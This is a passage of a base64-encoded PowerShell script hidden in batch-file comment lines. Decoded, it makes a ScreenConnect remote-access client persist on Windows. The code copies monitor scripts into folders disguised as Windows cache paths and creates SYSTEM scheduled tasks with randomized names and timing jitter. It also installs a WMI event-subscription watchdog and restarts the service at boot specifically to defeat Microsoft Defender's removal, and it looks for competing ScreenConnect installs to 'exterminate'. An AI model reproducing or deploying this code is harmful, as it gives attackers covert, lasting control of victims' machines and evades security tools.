::ew0KICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsNCiAgICAgICAgICAgIGlmICgkbGlu
::ZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRb
::JG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkaWQNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChb
::c3RyaW5nXSR0bikgew0KICAgIGlmICgkdG4pIHsgJiBzY2h0YXNrcy5leGUgL0Rl
::bGV0ZSAvVE4gJHRuIC9GIDI+JjEgfCBPdXQtTnVsbCB9DQp9DQoNCmZ1bmN0aW9u
::IEdldC1UYXNrVmVyYm9zZUJsb2IoW3N0cmluZ10kdG4pIHsNCiAgICBpZiAoLW5v
::dCAkdG4pIHsgcmV0dXJuICcnIH0NCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUg
::L1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFT
::VEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQpIHsgcmV0dXJuICcnIH0NCiAg
::ICByZXR1cm4gKCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2lu
::ICJgbiIpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10k
::dG4sIFtzdHJpbmddJG1hcmtlcikgew0KICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBz
::Y2hlZHVsZWQgYWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBu
::b3QgYSBXaW5kb3dzIENPTSBoYW5kbGVyLg0KICAgICRibG9iID0gR2V0LVRhc2tW
::ZXJib3NlQmxvYiAkdG4NCiAgICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZh
::bHNlIH0NCiAgICBpZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4
::XTo6RXNjYXBlKCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGlmICgk
::YmxvYiAtbWF0Y2ggJyg/aSlcLnd1Y2FjaGVcXHxvd25fbW9uXC5jbWR8ZXRsX21v
::blwuY21kfFwuZXRsY2FjaGVcXCcpIHsgcmV0dXJuICR0cnVlIH0NCiAgICByZXR1
::cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0K
::ICAgICMgSWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4g
::UG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOg0KICAgICMgb3duZWQgb2xkLW5h
::bWUgdGFza3MgYXJlIGRlbGV0ZWQ7IFdpbmRvd3MgYnVpbHQtaW5zIHdpdGggc2Ft
::ZSBuYW1lIGFyZSBsZWZ0IGFsb25lLg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1Bh
::dGgpIHsNCiAgICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkNCiAgICAgICAgIyBM
::NzogYWxzbyByZWdlbmVyYXRlIGlmIGFueSBUQVNLXyogaXMgZW1wdHkgKEw0LUw2
::IG1vZHVsby9jYXN0IGJ1Z3MgbGVmdCBibGFuayBzbG90cykNCiAgICAgICAgJHNs
::b3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAt
::YW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xk
::WydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddDQogICAgICAgIGlmICgkc2xv
::dHNPaykgeyByZXR1cm4gJG9sZCB9DQogICAgICAgIGZvcmVhY2ggKCRrIGluICdU
::QVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7DQogICAgICAgICAg
::ICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtdDQogICAgICAgICAgICBpZiAoLW5vdCAk
::dG4pIHsgY29udGludWUgfQ0KICAgICAgICAgICAgIyBOZXZlciBkZWxldGUgYSBy
::ZWFsIFdpbmRvd3MgdGFzayB3ZSBuZXZlciBvd25lZCAoVFIgaXMgQ09NL2N1c3Rv
::bSBoYW5kbGVyKS4NCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0
::biAnJykgeyBSZW1vdmUtVGFza1F1aWV0ICR0biB9DQogICAgICAgIH0NCiAgICAg
::ICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZQ0KICAg
::IH0NCiAgICAkcyA9IEdldC1Ib3N0U2VlZA0KICAgICMgTDQ6IHR3byBzbG90cyBt
::YXkgaGFzaCB0byB0aGUgc2FtZSB0YXNrIHBhdGggKHBvb2xzIHNoYXJlIG5hbWVz
::KSAtPg0KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
::IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80Lg0KICAgICMgV2FsayBlYWNo
::IHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNs
::b3RzLg0KICAgICMgTDY6IHRoZSBvbGQgQChAKCdBJywgJHMgJSA4KSwgLi4uKSBm
::b3JtIHdhcyBkb3VibGUtYnJva2VuIGluIFBTIDUuMToNCiAgICAjIGJhcmUgJSBp
::bnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5v
::dCBtb2R1bG8pLCBzbyB0aGUNCiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFu
::ZCB0aGUgbG9vcCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQ0K
::ICAgICMgVEFTS18qIGFuZCB0aGUgd2hvbGUgZmxlZXQgZmVsbCBiYWNrIHRvIGlk
::ZW50aWNhbCBkZWZhdWx0IHRhc2sgbmFtZXMuDQogICAgJHNlZWRzID0gW29yZGVy
::ZWRdQHsNCiAgICAgICAgQSA9ICgkcyAlIDgpDQogICAgICAgIEIgPSAoKCRzICsg
::MykgJSA4KQ0KICAgICAgICBDID0gKCgkcyArIDUpICUgOCkNCiAgICAgICAgRCA9
::ICgoJHMgKyA3KSAlIDgpDQogICAgfQ0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9
::DQogICAgZm9yZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsNCiAg
::ICAgICAgJGkgPSBbaW50XSRzZWVkc1skbGV0dGVyXQ0KICAgICAgICAkbmFtZSA9
::ICRQb29sc1skbGV0dGVyXVskaV0NCiAgICAgICAgJG4gPSAwDQogICAgICAgIHdo
::aWxlICgkcGljay5WYWx1ZXMgLWNvbnRhaW5zICRuYW1lIC1hbmQgJG4gLWx0IDgp
::IHsgJGkgPSAoJGkgKyAxKSAlIDg7ICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRp
::XTsgJG4rKyB9DQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERl
::ZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9DQogICAgICAgICRwaWNrWyRsZXR0ZXJd
::ID0gJG5hbWUNCiAgICB9DQogICAgJGNmZyA9IEAoDQogICAgICAgICJUQVNLX0E9
::JCgkcGljay5BKSINCiAgICAgICAgIlRBU0tfQj0kKCRwaWNrLkIpIg0KICAgICAg
::ICAiVEFTS19DPSQoJHBpY2suQykiDQogICAgICAgICJUQVNLX0Q9JCgkcGljay5E
::KSINCiAgICAgICAgIk1PX0E9JCgyICsgKCRzICUgNCkpIiAgICAgICAgICAjIDIt
::NSBtaW4gaml0dGVyDQogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMp
::KSIgICAgIyAzLTUgbWluIGppdHRlcg0KICAgICAgICAiU0VFRD0kcyINCiAgICAg
::ICAgIklERU5UVkVSPSRJZGVudFZlcnNpb24iDQogICAgKQ0KICAgIFNldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UNCiAg
::ICByZXR1cm4gKFJlYWQtSWRlbnRpdHkpDQp9DQoNCmZ1bmN0aW9uIE5vcm1hbGl6
::ZS1UYXNrTmFtZShbc3RyaW5nXSR0bikgew0KICAgIGlmICgtbm90ICR0bikgeyBy
::ZXR1cm4gJycgfQ0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcp
::DQp9DQoNCmZ1bmN0aW9uIFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7DQogICAg
::JGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAgdHJ5IHsg
::QWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9
::IGNhdGNoIHt9DQp9DQoNCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3Mgew0K
::ICAgICMgTWlycm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNj
::aHRhc2tzLCBCT09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuDQogICAgJGlkID0g
::SW5pdGlhbGl6ZS1JZGVudGl0eQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRN
::b25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAg
::ICRib290ID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNo
::ZScNCiAgICAkZXRsRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFn
::bm9zaXNcU3RhdGVcLmV0bGNhY2hlJw0KICAgIGZvcmVhY2ggKCRkIGluIEAoJGJv
::b3QsICRldGxEaXIpKSB7DQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxp
::dGVyYWxQYXRoICRkKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Q
::YXRoICRkIC1Gb3JjZSB8IE91dC1OdWxsIH0NCiAgICB9DQogICAgJGJvb3RNb24g
::PSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJw0KICAgICRib290RXRsID0g
::Sm9pbi1QYXRoICRib290ICdldGxfbW9uLmNtZCcNCiAgICAkZXRsTW9uID0gSm9p
::bi1QYXRoICRldGxEaXIgJ2V0bF9tb24uY21kJw0KICAgIGlmIChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRNb25QYXRoKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0
::ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBDb3B5LUl0ZW0g
::LUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdEV0bCAtRm9y
::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgQ29weS1J
::dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAg
::IyBMMzc6IGRlZGljYXRlZCBib290IGdyeXhhLWhlYWwuIERlZmVuZGVyIGNhbiBz
::dHJpcCB0aGUgZ3J5eGEgU0NNIHNlcnZpY2UgZW50cnkgZHVyaW5nDQogICAgIyBi
::b290IGJlZm9yZSB0aGUgbW9uJ3MgTUlOVVRFIHRhc2sgZmlyZXMuIEEgYm9vdC10
::cmlnZ2VyIGVuc3VyZSAoLU5vV2FpdCAtRm9yY2UpIHJlLWNyZWF0ZXMNCiAgICAj
::IGl0IHdpdGhpbiBzZWNvbmRzIG9mIHN0YXJ0dXAsIHNvIHJlYm9vdHMgbm8gbG9u
::Z2VyIGRyb3AgdGhlIGhvc3QgZnJvbSBncnl4YS4NCiAgICAkYm9vdEdyeXhhID0g
::Sm9pbi1QYXRoICRib290ICdncnl4YV9ib290LmNtZCcNCiAgICAkbGliSW5Cb290
::ID0gSm9pbi1QYXRoICRib290ICdvd25fbGliLnBzMScNCiAgICBpZiAoVGVzdC1Q
::YXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBz
::MScpKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0
::aCAkV29ya0RpciAnb3duX2xpYi5wczEnKSAtRGVzdGluYXRpb24gJGxpYkluQm9v
::dCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQog
::ICAgJGdiTGluZXMgPSBAKA0KICAgICAgICAnQGVjaG8gb2ZmJywNCiAgICAgICAg
::J3JlbSBMNDYgRlJFRVpFIGJvb3Qgc2Mgc3RhcnQgb25seScsDQogICAgICAgICdz
::YyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKDM2ZTUwNmZmMDE2YjIxNTEp
::IiA+bnVsIDI+JjEnLA0KICAgICAgICAnZXhpdCcNCiAgICApDQogICAgU2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRib290R3J5eGEgLVZhbHVlICRnYkxpbmVzIC1F
::bmNvZGluZyBBU0NJSSAtRm9yY2UNCiAgICAjIEJPT1QgaXMgbm90IExvY2tEaXIn
::ZCBieSBvd25fc2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBU
::UiB0aGVyZS4NCiAgICAkdHJNb24gPSAiY21kLmV4ZSAvYyAkYm9vdE1vbiINCiAg
::ICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCINCiAgICAkdHJHcnl4YSA9
::ICJjbWQuZXhlIC9jICRib290R3J5eGEiDQogICAgJG1vQSA9IFtzdHJpbmddJGlk
::WydNT19BJ107IGlmICgtbm90ICRtb0EpIHsgJG1vQSA9ICcyJyB9DQogICAgJG1v
::QiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1vQiA9
::ICczJyB9DQogICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygnSEg6bW0nKQ0K
::ICAgICRzcGVjcyA9IEAoDQogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJr
::ZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRy
::ID0gJHRyTW9uIH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9
::ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVURSc7IE1vID0gJG1vQjsgVHIgPSAk
::dHJFdGwgfQ0KICAgICAgICBAeyBLZXkgPSAnVEFTS19DJzsgTWFya2VyID0gJ293
::bl9tb24uY21kJzsgU2MgPSAnT05TVEFSVCc7IE1vID0gJyc7IFRyID0gJHRyTW9u
::IH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9u
::LmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9DQog
::ICAgICAgIEB7IEtleSA9ICdUQVNLX0cnOyBNYXJrZXIgPSAnZ3J5eGFfYm9vdC5j
::bWQnOyBTYyA9ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJHcnl4YSB9DQog
::ICAgKQ0KICAgICRvayA9IDA7ICRyZWFybWVkID0gMDsgJGZhaWwgPSAwDQogICAg
::Zm9yZWFjaCAoJHNwIGluICRzcGVjcykgew0KICAgICAgICAjIFRBU0tfRyAoYm9v
::dCBncnl4YS1oZWFsKSB1c2VzIGEgZml4ZWQgbmFtZTsgdGhlIEEtRCByb3RhdGlv
::biBwb29sIGhhcyBubyBzbG90IGZvciBpdC4NCiAgICAgICAgJHRuID0gaWYgKCRz
::cC5LZXkgLWVxICdUQVNLX0cnKSB7ICdXdWNhY2hlR3J5eGFCb290JyB9IGVsc2Ug
::eyBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXldKSB9DQog
::ICAgICAgIGlmICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9DQogICAg
::ICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSB7ICRvaysr
::OyBjb250aW51ZSB9DQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICgiXCR0
::biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0NCiAgICAgICAgJGJs
::b2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bg0KICAgICAgICBpZiAoLW5vdCAk
::YmxvYikgeyAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgKCJcJHRuIikgfQ0K
::ICAgICAgICBpZiAoJGJsb2IpIHsNCiAgICAgICAgICAgICRvdXJzQnJva2VuID0g
::KCRibG9iIC1tYXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8Z3J5
::eGFfYm9vdFwuY21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpDQogICAgICAg
::ICAgICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25M
::b2cgInRhc2tzX3NraXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9DQogICAgICAg
::ICAgICBSZW1vdmUtVGFza1F1aWV0ICR0bg0KICAgICAgICAgICAgUmVtb3ZlLVRh
::c2tRdWlldCAoIlwkdG4iKQ0KICAgICAgICB9DQogICAgICAgICMgQnVpbGQgY21k
::bGluZSBleGFjdGx5IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3b3Jr
::IGFzIFNZU1RFTSkuDQogICAgICAgICRwYXJ0cyA9IEAoDQogICAgICAgICAgICAn
::L0NyZWF0ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdI
::SUdIRVNUJywgJy9GJywNCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0Mn
::LCAkc3AuU2MNCiAgICAgICAgKQ0KICAgICAgICBpZiAoJHNwLlNjIC1lcSAnTUlO
::VVRFJykgew0KICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycsICRzcC5Nbywg
::Jy9TVCcsICRzdCkNCiAgICAgICAgfQ0KICAgICAgICAkYXJnTGluZSA9ICgkcGFy
::dHMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNo
::ICdbXHMiXScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9
::IGVsc2UgeyAkXyB9DQogICAgICAgIH0pIC1qb2luICcgJw0KICAgICAgICAkY3Jl
::YXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYx
::IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0NCiAgICAgICAgJGNyZWF0ZUpvaW5l
::ZCA9ICgkY3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgpDQogICAgICAgIFdyaXRl
::LU93bkxvZyAidGFza3NfY3JlYXRlICQoJHNwLktleSkgJHRuID0+ICRjcmVhdGVK
::b2luZWQiDQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1h
::cmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIp
::KSB7DQogICAgICAgICAgICAkcmVhcm1lZCsrDQogICAgICAgICAgICBpZiAoJHNw
::LktleSAtZXEgJ1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7DQog
::ICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1RO
::IGAiJHRuYCIiIHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBl
::bHNlIHsNCiAgICAgICAgICAgICRmYWlsKysNCiAgICAgICAgICAgIFdyaXRlLU93
::bkxvZyAidGFza3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iDQogICAgICAg
::IH0NCiAgICB9DQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVh
::cm1lZCBmYWlsPSRmYWlsIg0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cg
::ew0KICAgIGZvcmVhY2ggKCRjbHMgaW4gQCgnX19GaWx0ZXJUb0NvbnN1bWVyQmlu
::ZGluZycsJ19fRXZlbnRGaWx0ZXInLCdDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIn
::LCdfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbicpKSB7DQogICAgICAgIEdldC1X
::bWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNs
::cyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBX
::aGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICgkXy5OYW1lIC1lcSAnV3Vj
::YWNoZVdhdGNoZG9nRicpIC1vciAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRv
::Z0MnKSAtb3INCiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2Fj
::aGVXYXRjaGRvZycpIC1vcg0KICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFu
::ZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0Yq
::JykgLW9yDQogICAgICAgICAgICAgICAgKCRfLkNvbnN1bWVyIC1hbmQgJF8uQ29u
::c3VtZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJykNCiAg
::ICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0
::LU51bGwgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7
::DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICRmYWxzZSB9DQogICAg
::UmVtb3ZlLVdhdGNoZG9nDQogICAgJG9rID0gJHRydWUNCiAgICB0cnkgew0KICAg
::ICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
::biAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYA0KICAgICAgICAg
::ICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IElu
::dGVydmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFs
::c2UgfSB8IE91dC1OdWxsDQogICAgICAgICRmID0gU2V0LVdtaUluc3RhbmNlIC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIg
::YA0KICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
::aGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5n
::dWFnZSA9ICdXUUwnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9
::ICJTRUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNh
::Y2hlV2F0Y2hkb2cnIiB9DQogICAgICAgICRjID0gU2V0LVdtaUluc3RhbmNlIC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZl
::bnRDb25zdW1lciBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAn
::V3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4
::ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0N
::CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYA0KICAgICAg
::ICAgICAgLUFyZ3VtZW50cyBAeyBGaWx0ZXIgPSAkZjsgQ29uc3VtZXIgPSAkYyB9
::IHwgT3V0LU51bGwNCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0NCiAgICBy
::ZXR1cm4gJG9rDQp9DQoNCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7DQog
::ICAgJHQgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRp
::b24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIC1GaWx0ZXIgIlRp
::bWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxz
::dWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0n
::V3VjYWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::DQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJO
::YW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICAkYiA9ICRudWxsDQogICAgaWYgKCRmIC1hbmQgJGMpIHsNCiAg
::ICAgICAgJGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsgJF8uRmlsdGVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionIC1hbmQgJF8u
::Q29uc3VtZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicgfSB8DQogICAgICAg
::ICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIHJldHVybiBb
::Ym9vbF0oJHQgLWFuZCAkZiAtYW5kICRjIC1hbmQgJGIpDQp9DQoNCmZ1bmN0aW9u
::IEVuc3VyZS1XYXRjaGRvZyB7DQogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkg
::eyByZXR1cm4gJ09LJyB9DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJu
::ICdNSVNTSU5HJyB9DQogICAgaWYgKEluc3RhbGwtV2F0Y2hkb2cpIHsgcmV0dXJu
::ICdSRUFSTUVEJyB9DQogICAgcmV0dXJuICdGQUlMJw0KfQ0KDQojIENvcnJlY3Qg
::MzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBh
::IHRydW5jYXRlZA0KIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29m
::dFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdA0KIyB3YXMgaW52
::aXNpYmxlIHRvIHJlcGFpci9leHRlcm1pbmF0ZS9yZWdpc3RlcmVkLg0KJHNjcmlw
::dDpVbmluc3RhbGxSb290cyA9IEAoDQogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgJ0hL
::TE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJl
::bnRWZXJzaW9uXFVuaW5zdGFsbCcNCikNCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lz
::dGVyZWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEw4OiBORVZFUiB1
